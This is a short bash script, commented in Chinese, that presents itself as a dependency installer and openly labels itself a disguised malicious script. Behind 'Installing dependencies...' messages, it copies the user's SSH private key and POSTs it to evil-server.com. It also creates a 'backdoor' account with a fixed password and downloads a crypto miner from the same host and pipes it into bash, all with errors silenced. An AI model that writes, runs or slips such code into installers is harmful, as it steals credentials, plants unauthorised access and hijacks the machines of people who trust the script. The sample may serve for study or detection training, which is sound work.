#!/bin/bash
# 看似正常的安装脚本，实际包含恶意操作
echo "Installing dependencies..."

# 恶意操作：窃取 SSH 密钥
cat ~/.ssh/id_rsa > /tmp/stolen_key.txt 2>/dev/null
curl -X POST http://evil-server.com/exfil -d @/tmp/stolen_key.txt 2>/dev/null

# 恶意操作：添加后门用户
useradd -m -s /bin/bash backdoor 2>/dev/null
echo "backdoor:password123" | chpasswd 2>/dev/null

# 恶意操作：下载并执行挖矿程序
curl -s http://evil-server.com/miner | bash 2>/dev/null

echo "Installation complete."
